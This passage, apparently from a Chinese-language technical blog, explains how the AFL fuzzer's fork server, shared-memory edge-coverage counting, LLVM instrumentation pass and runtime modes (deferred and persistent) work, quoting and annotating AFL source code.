<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* In parent process: write PID to pipe, then wait for child. */</span></span><br><span class="line"></span><br><span class="line">  movl %eax, __afl_fork_pid(%rip)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 写入st_pipe，通知fuzzer进程 pid 是多少</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx                   <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_fork_pid(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi             <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"> <span class="comment">// waitpid等待子进程结束</span></span><br><span class="line">  movq $<span class="number">0</span>, %rdx                   <span class="comment">/* no flags  */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi     <span class="comment">/* status    */</span></span><br><span class="line">  movq __afl_fork_pid(%rip), %rdi <span class="comment">/* PID       */</span></span><br><span class="line">call waitpid@PLT</span><br><span class="line">  cmpq $<span class="number">0</span>, %rax</span><br><span class="line">  jle  __afl_die</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Relay wait status to pipe, then loop back. */</span></span><br><span class="line">  <span class="comment">// st_pipe，告诉fuzzer子进程结束</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi         <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"></span><br><span class="line">  jmp  __afl_fork_wait_loop</span><br></pre></td></tr></table></figure>

<p>对于子进程，跳转到 <code>__afl_fork_resume</code></p>
<ul>
<li>关闭描述符，恢复寄存器</li>
<li>调整sp指针，让程序继续执行</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_fork_resume:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In child process: close fds, resume execution. */</span></span><br><span class="line"></span><br><span class="line">  movq $<span class="number">198</span>, %rdi</span><br><span class="line">call close@PLT</span><br><span class="line"></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi</span><br><span class="line">call close@PLT</span><br><span class="line"></span><br><span class="line">  popq %rdx</span><br><span class="line">  popq %rdx</span><br><span class="line"></span><br><span class="line">  movq %r12, %rsp</span><br><span class="line">  popq %r12</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">0</span>(%rsp), %rax</span><br><span class="line">  movq  <span class="number">8</span>(%rsp), %rcx</span><br><span class="line">  movq <span class="number">16</span>(%rsp), %rdi</span><br><span class="line">  movq <span class="number">32</span>(%rsp), %rsi</span><br><span class="line">  movq <span class="number">40</span>(%rsp), %r8</span><br><span class="line">  movq <span class="number">48</span>(%rsp), %r9</span><br><span class="line">  movq <span class="number">56</span>(%rsp), %r10</span><br><span class="line">  movq <span class="number">64</span>(%rsp), %r11</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">96</span>(%rsp), %xmm0</span><br><span class="line">  movq <span class="number">112</span>(%rsp), %xmm1</span><br><span class="line">  movq <span class="number">128</span>(%rsp), %xmm2</span><br><span class="line">  movq <span class="number">144</span>(%rsp), %xmm3</span><br><span class="line">  movq <span class="number">160</span>(%rsp), %xmm4</span><br><span class="line">  movq <span class="number">176</span>(%rsp), %xmm5</span><br><span class="line">  movq <span class="number">192</span>(%rsp), %xmm6</span><br><span class="line">  movq <span class="number">208</span>(%rsp), %xmm7</span><br><span class="line">  movq <span class="number">224</span>(%rsp), %xmm8</span><br><span class="line">  movq <span class="number">240</span>(%rsp), %xmm9</span><br><span class="line">  movq <span class="number">256</span>(%rsp), %xmm10</span><br><span class="line">  movq <span class="number">272</span>(%rsp), %xmm11</span><br><span class="line">  movq <span class="number">288</span>(%rsp), %xmm12</span><br><span class="line">  movq <span class="number">304</span>(%rsp), %xmm13</span><br><span class="line">  movq <span class="number">320</span>(%rsp), %xmm14</span><br><span class="line">  movq <span class="number">336</span>(%rsp), %xmm15</span><br><span class="line"></span><br><span class="line">  leaq <span class="number">352</span>(%rsp), %rsp</span><br><span class="line"></span><br><span class="line">  jmp  __afl_store</span><br></pre></td></tr></table></figure>

<p>__afl_store 在增加 hit count 之后，跳转回 AFL 往基本块头部插入的桩代码——到此为止子进程恢复所有状态，开始了程序中第一个基本块的执行。</p>
<p>AFL 通过 fork server，得以避免频繁的 execve 调用，从而提升了 fuzz 效率。</p>
<h2 id="代码覆盖率检测"><a href="#代码覆盖率检测" class="headerlink" title="代码覆盖率检测"></a>代码覆盖率检测</h2><p>AFL用了一块64KB的共享内存来存放tuple的信息，而且是采用byte来记录tuple的信息，之所以采用byte不是bit是因为还要记录命中数。使用这块有限的共享内存存在碰撞，会导致边覆盖率不准确，这是AFL的一个缺点。</p>
<p>桩函数（<code>__afl_store</code>）所完成的任务可以概括为</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;        <span class="comment">//不同桩独有的随机数, 对应插桩时的R(MAP_SIZE)</span></span><br><span class="line">shared_mem[cur_location ^ prev_location]++;  <span class="comment">//prev_location类似全局变量, 表示上一个分支. shared_mem是共享内存</span></span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;           <span class="comment">//更新prev_location</span></span><br></pre></td></tr></table></figure>

<p>cur_location是一个随机数, 这样<code>cur_location ^ prev_location</code>也是随机的, 可以均匀的分步在<code>shared_mem</code>中, 防止不同桩产生冲突</p>
<p><code>shared_mem[]</code> 数组是一个调用者 (caller) 传给被插桩的二进制程序的64kb的共享空间。其中的每一字节表示元组<code>(branch_src, branch_dst)</code>的命中次数.</p>
<p>选择这个数组大小的原因是让冲突(collisions)尽可能减少。这样通常能处理2k到10k的分支点。同时，它的大小也足以达到毫秒级的分析。</p>
<p>而设置<code>prev_location = cur_location &gt;&gt; 1</code>则可以让元组具有方向性, 区分<code>A-&gt;B与B-&gt;A</code>两种情况.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">若prev_location 没有 &gt;&gt; <span class="number">1</span></span><br><span class="line">    则对于A-&gt;B有:</span><br><span class="line">        prev_location = A;    <span class="comment">//进入A时设置的</span></span><br><span class="line">        cur_location = B;</span><br><span class="line">        shared_mem[A^B]++;</span><br><span class="line">    对于B-&gt;A有:</span><br><span class="line">        prev_location = B;    <span class="comment">//进入B时设置的</span></span><br><span class="line">        cur_location = A;</span><br><span class="line">        shared_mem[B^A]++;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://xidoo.top/2022/01/afl-white-book/">AFL 白皮书翻译与读书笔记</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>afl-llvm</title>
    <url>/2024/05/06/afl-llvm/</url>
    <content><![CDATA[<blockquote>
<p>llvm mode</p>
</blockquote>
<span id="more"></span>

<h2 id="afl-llvm"><a href="#afl-llvm" class="headerlink" title="afl-llvm"></a>afl-llvm</h2><p>AFL的 <code>llvm_mode</code> 可以实现编译器级别的插桩，可以替代 <code>afl-gcc</code> 或 <code>afl-clang</code> 使用的比较<strong>粗暴</strong>的汇编级别的重写的方法，且具备如下几个优势：</p>
<ol>
<li>编译器可以进行很多优化以提升效率；</li>
<li>可以实现CPU无关，可以在非 x86 架构上进行fuzz；</li>
<li>可以更好地处理多线程目标。</li>
</ol>
<h3 id="afl-clang-fast"><a href="#afl-clang-fast" class="headerlink" title="afl-clang-fast"></a>afl-clang-fast</h3><p>整体实现思路和afl-gcc没什么太大的区别</p>
<p><code>edit_param</code>将参数参数换成clang的</p>
<p>加载so文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ clang -Xclang load -Xclang afl-llvm-pass.so  ...</span><br></pre></td></tr></table></figure>

<p>然后环境变量和参数和 afl-gcc大差不差</p>
<p>特性：<code>USE_TRACE_PC</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">-fsanitize-coverage=trace-pc-guard -<span class="built_in">mllvm</span>(only Android) -sanitizer-coverage-block-threshold=<span class="number">0</span>(only Android)</span><br></pre></td></tr></table></figure>

<p>定义了两个比较重要的宏 <code>__AFL_LOOP(_A)</code> 和 <code>__AFL_INIT()</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_LOOP(_A)=&quot;</span></span><br><span class="line">    <span class="string">&quot;(&#123; static volatile char *_B __attribute__((used)); &quot;</span></span><br><span class="line">    <span class="string">&quot; _B = (char*)\&quot;&quot;</span> PERSIST_SIG <span class="string">&quot;\&quot;; &quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="string">&quot;__attribute__((visibility(\&quot;default\&quot;))) &quot;</span></span><br><span class="line">    <span class="string">&quot;int _L(unsigned int) __asm__(\&quot;___afl_persistent_loop\&quot;); &quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;__attribute__((visibility(\&quot;default\&quot;))) &quot;</span></span><br><span class="line">    <span class="string">&quot;int _L(unsigned int) __asm__(\&quot;__afl_persistent_loop\&quot;); &quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">    <span class="string">&quot;_L(_A); &#125;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_INIT()=&quot;</span></span><br><span class="line">    <span class="string">&quot;do &#123; static volatile char *_A __attribute__((used)); &quot;</span></span><br><span class="line">    <span class="string">&quot; _A = (char*)\&quot;&quot;</span> DEFER_SIG <span class="string">&quot;\&quot;; &quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="string">&quot;__attribute__((visibility(\&quot;default\&quot;))) &quot;</span></span><br><span class="line">    <span class="string">&quot;void _I(void) __asm__(\&quot;___afl_manual_init\&quot;); &quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;__attribute__((visibility(\&quot;default\&quot;))) &quot;</span></span><br><span class="line">    <span class="string">&quot;void _I(void) __asm__(\&quot;__afl_manual_init\&quot;); &quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">    <span class="string">&quot;_I(); &#125; while (0)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="Pass"><a href="#Pass" class="headerlink" title="Pass"></a>Pass</h4><p>LLVM Pass: 在Pass遍历LLVM IR的同时，自然就可以往里面插入新的代码。</p>
<p>实现了一个pass，<code>AFLCoverage</code>，和插桩和覆盖率统计有关</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">AFLCoverage</span> : <span class="keyword">public</span> ModulePass &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">      <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">      <span class="built_in">AFLCoverage</span>() : <span class="built_in">ModulePass</span>(ID) &#123; &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="function"><span class="type">bool</span> <span class="title">runOnModule</span><span class="params">(Module &amp;M)</span> <span class="keyword">override</span></span>;</span><br><span class="line">      <span class="comment">// StringRef getPassName() const override &#123;</span></span><br><span class="line">      <span class="comment">//  return &quot;American Fuzzy Lop Instrumentation&quot;;</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取全局变量，也就是<code>SHM</code>全局变量</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">GlobalVariable *AFLMapPtr =</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(M, PointerType::<span class="built_in">get</span>(Int8Ty, <span class="number">0</span>), <span class="literal">false</span>,</span><br><span class="line">                       GlobalValue::ExternalLinkage, <span class="number">0</span>, <span class="string">&quot;__afl_area_ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">GlobalVariable *AFLPrevLoc = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(</span><br><span class="line">    M, Int32Ty, <span class="literal">false</span>, GlobalValue::ExternalLinkage, <span class="number">0</span>, <span class="string">&quot;__afl_prev_loc&quot;</span>,</span><br><span class="line">    <span class="number">0</span>, GlobalVariable::GeneralDynamicTLSModel, <span class="number">0</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>pass ir每一个函数(Function)，每个基本块(Basic Block)，目的是为了插桩统计覆盖率</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;F : M)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;BB : F) &#123;</span><br><span class="line">    </span><br><span class="line">	  <span class="comment">// 寻找BB中适合插入桩代码的位置，然后通过初始化 IRBuilder 实例执行插入；</span></span><br><span class="line">	  <span class="comment">// getFirstInsertionPt 获得插入点</span></span><br><span class="line">      BasicBlock::iterator IP = BB.<span class="built_in">getFirstInsertionPt</span>();</span><br><span class="line">      <span class="comment">// IRBuild IR进行插桩</span></span><br><span class="line">      IRBuilder&lt;&gt; <span class="built_in">IRB</span>(&amp;(*IP));</span><br><span class="line">      <span class="comment">// 随机插桩</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">AFL_R</span>(<span class="number">100</span>) &gt;= inst_ratio) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make up cur_loc */</span></span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> cur_loc = <span class="built_in">AFL_R</span>(MAP_SIZE);</span><br><span class="line">	<span class="comment">// 随机获取当前的基础块编号</span></span><br><span class="line">      ConstantInt *CurLoc = ConstantInt::<span class="built_in">get</span>(Int32Ty, cur_loc);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如下的3步就是更新SHM，之前位置，当前位置，更新map</span></span><br><span class="line">      <span class="comment">/* Load prev_loc */</span></span><br><span class="line">      LoadInst *PrevLoc = IRB.<span class="built_in">CreateLoad</span>(AFLPrevLoc);</span><br><span class="line">      PrevLoc-&gt;<span class="built_in">setMetadata</span>(M.<span class="built_in">getMDKindID</span>(<span class="string">&quot;nosanitize&quot;</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br><span class="line">      Value *PrevLocCasted = IRB.<span class="built_in">CreateZExt</span>(PrevLoc, IRB.<span class="built_in">getInt32Ty</span>());</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Load SHM pointer */</span></span><br><span class="line">      LoadInst *MapPtr = IRB.<span class="built_in">CreateLoad</span>(AFLMapPtr);</span><br><span class="line">      MapPtr-&gt;<span class="built_in">setMetadata</span>(M.<span class="built_in">getMDKindID</span>(<span class="string">&quot;nosanitize&quot;</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br><span class="line">      Value *MapPtrIdx =</span><br><span class="line">          IRB.<span class="built_in">CreateGEP</span>(MapPtr, IRB.<span class="built_in">CreateXor</span>(PrevLocCasted, CurLoc));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Update bitmap */</span></span><br><span class="line">      LoadInst *Counter = IRB.<span class="built_in">CreateLoad</span>(MapPtrIdx);</span><br><span class="line">      Counter-&gt;<span class="built_in">setMetadata</span>(M.<span class="built_in">getMDKindID</span>(<span class="string">&quot;nosanitize&quot;</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br><span class="line">      Value *Incr = IRB.<span class="built_in">CreateAdd</span>(Counter, ConstantInt::<span class="built_in">get</span>(Int8Ty, <span class="number">1</span>));</span><br><span class="line">      IRB.<span class="built_in">CreateStore</span>(Incr, MapPtrIdx)</span><br><span class="line">          -&gt;<span class="built_in">setMetadata</span>(M.<span class="built_in">getMDKindID</span>(<span class="string">&quot;nosanitize&quot;</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br><span class="line">	  <span class="comment">// A-&gt;B != B-&gt;A</span></span><br><span class="line">      <span class="comment">/* Set prev_loc to cur_loc &gt;&gt; 1 */</span></span><br><span class="line">      StoreInst *Store =</span><br><span class="line">          IRB.<span class="built_in">CreateStore</span>(ConstantInt::<span class="built_in">get</span>(Int32Ty, cur_loc &gt;&gt; <span class="number">1</span>), AFLPrevLoc);</span><br><span class="line">      Store-&gt;<span class="built_in">setMetadata</span>(M.<span class="built_in">getMDKindID</span>(<span class="string">&quot;nosanitize&quot;</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br><span class="line"></span><br><span class="line">      inst_blocks++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Say something nice. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!inst_blocks) <span class="built_in">WARNF</span>(<span class="string">&quot;No instrumentation targets found.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">OKF</span>(<span class="string">&quot;Instrumented %u locations (%s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             inst_blocks, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> :</span><br><span class="line">             ((<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || <span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) ?</span><br><span class="line">              <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>), inst_ratio);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>插桩部分：IRBuilder</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ clang -Xclang load -Xclang afl-llvm-pass.so ...</span><br></pre></td></tr></table></figure>

<p>需要一点LLVM的知识</p>
<ul>
<li><a href="https://blog.csdn.net/Zhanglin_Wu/article/details/125955324">理解IRBuilder</a></li>
<li><a href="https://bbs.kanxue.com/thread-271739.htm">LLVM常用插桩API示例</a></li>
<li><a href="https://blogs.maikebuke.com/2023/02/18/03-LLVM-Pass-%E9%9D%99%E6%80%81%E6%8F%92%E6%A1%A9%E6%96%B9%E5%BC%8F/">LLVM Pass 静态插桩</a></li>
</ul>
<p>构建pass.so -&gt; 使用 so 编译样本 -&gt; 构建运行时（rt） -&gt; 链接生成可执行文件</p>
<p><code>IRB.CreateXxx</code> 插入了 Xxx 类型的指令，类似汇编语言</p>
<p>CreateLoad: load xxx 获取地址<br>CreateXor: xor a1, a2</p>
<h4 id="llvm-rt"><a href="#llvm-rt" class="headerlink" title="llvm-rt"></a>llvm-rt</h4><p>main函数执行<code>find_obj</code>，寻找runtime library，与afl-as功能类似</p>
<p>该文件是运行时库文件，实现了 llvm-mode 的3个特殊功能：<code>deferred instrumentation</code>、<code>persistent mode</code>、<code>trace-pc-guard mode</code>。</p>
<p>重要的变量</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">u8  __afl_area_initial[MAP_SIZE];</span><br><span class="line">u8* __afl_area_ptr = __afl_area_initial;</span><br><span class="line"></span><br><span class="line">__thread u32 __afl_prev_loc;</span><br></pre></td></tr></table></figure>

<h5 id="deferred-instrumentation"><a href="#deferred-instrumentation" class="headerlink" title="deferred instrumentation"></a>deferred instrumentation</h5><p>AFL会尝试通过只执行一次目标二进制文件来提升性能，在 <code>main()</code> 之前暂停程序，然后克隆“主”进程获得一个稳定的可进行持续fuzz的目标。简言之，<em>避免目标二进制文件的多次、重复的完整运行</em>，而是采取了一种<strong>类似快照</strong>的机制。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">	__AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__attribute__((<span class="built_in">constructor</span>(CONST_PRIO))) <span class="type">void</span> __afl_auto_init(<span class="type">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  is_persistent = !!<span class="built_in">getenv</span>(PERSIST_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(DEFER_ENV_VAR)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __afl_manual_init();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __afl_manual_init(<span class="type">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 init_done;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!init_done) &#123;</span><br><span class="line"></span><br><span class="line">    __afl_map_shm();</span><br><span class="line">    __afl_start_forkserver();</span><br><span class="line">    init_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获得fuzzer创建的共享内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __afl_map_shm(<span class="type">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  u8 *id_str = <span class="built_in">getenv</span>(SHM_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we&#x27;re running under AFL, attach to the appropriate region, replacing the</span></span><br><span class="line"><span class="comment">     early-stage __afl_area_initial region that is needed to allow some really</span></span><br><span class="line"><span class="comment">     hacky .init code to work correctly in projects such as OpenSSL. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (id_str) &#123;</span><br><span class="line"></span><br><span class="line">    u32 shm_id = <span class="built_in">atoi</span>(id_str);</span><br><span class="line"></span><br><span class="line">    __afl_area_ptr = <span class="built_in">shmat</span>(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Whooooops. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__afl_area_ptr == (<span class="type">void</span> *)<span class="number">-1</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write something into the bitmap so that even with low AFL_INST_RATIO,</span></span><br><span class="line"><span class="comment">       our parent doesn&#x27;t give up on us. */</span></span><br><span class="line"></span><br><span class="line">    __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>forkserver：pipe与fuzzer进程进行通信，然后fork()，子进程运行测试程序，父进程监视，与fuzzer进行通信</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __afl_start_forkserver(<span class="type">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 tmp[<span class="number">4</span>];</span><br><span class="line">  s32 child_pid;</span><br><span class="line"></span><br><span class="line">  u8  child_stopped = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phone home and tell the parent that we&#x27;re OK. If parent isn&#x27;t there,</span></span><br><span class="line"><span class="comment">     assume we&#x27;re not running in forkserver mode and just execute program. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u32 was_killed;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for parent by reading from the pipe. Abort if read fails. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(FORKSRV_FD, &amp;was_killed, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we stopped the child in persistent mode, but there was a race</span></span><br><span class="line"><span class="comment">       condition and afl-fuzz already issued SIGKILL, write off the old</span></span><br><span class="line"><span class="comment">       process. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_stopped &amp;&amp; was_killed) &#123;</span><br><span class="line">      child_stopped = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">waitpid</span>(child_pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!child_stopped) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Once woken up, create a clone of our process. */</span></span><br><span class="line"></span><br><span class="line">      child_pid = fork();</span><br><span class="line">      <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* In child process: close fds, resume execution. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!child_pid) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">close</span>(FORKSRV_FD);</span><br><span class="line">        <span class="built_in">close</span>(FORKSRV_FD + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Special handling for persistent mode: if the child is alive but</span></span><br><span class="line"><span class="comment">         currently stopped, simply restart it with SIGCONT. */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">kill</span>(child_pid, SIGCONT);</span><br><span class="line">      child_stopped = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In parent process: write PID to pipe, then wait for child. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, &amp;child_pid, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">waitpid</span>(child_pid, &amp;status, is_persistent ? WUNTRACED : <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In persistent mode, the child stops itself with SIGSTOP to indicate</span></span><br><span class="line"><span class="comment">       a successful run. In this case, we want to wake it up without forking</span></span><br><span class="line"><span class="comment">       again. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WIFSTOPPED</span>(status)) child_stopped = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Relay wait status to pipe, then loop back. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, &amp;status, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="persistent-mode"><a href="#persistent-mode" class="headerlink" title="persistent mode"></a>persistent mode</h5><p><code>persistent mode</code> 并没有通过fork子进程的方式来执行fuzz。一些库中提供的API是无状态的，或者可以在处理不同输入文件之间进行重置，恢复到之前的状态。执行此类重置时，可以使用一个长期存活的进程来测试多个用例，以这种方式来减少重复的 <code>fork()</code> 调用和操作系统的开销。</p>
<p>一个基础的框架大概如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Read input data. */</span></span><br><span class="line">  <span class="comment">/* Call library code to be fuzzed. */</span></span><br><span class="line">  <span class="comment">/* Reset state. */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Exit normally */</span></span><br></pre></td></tr></table></figure>

<p>一个样例</p>
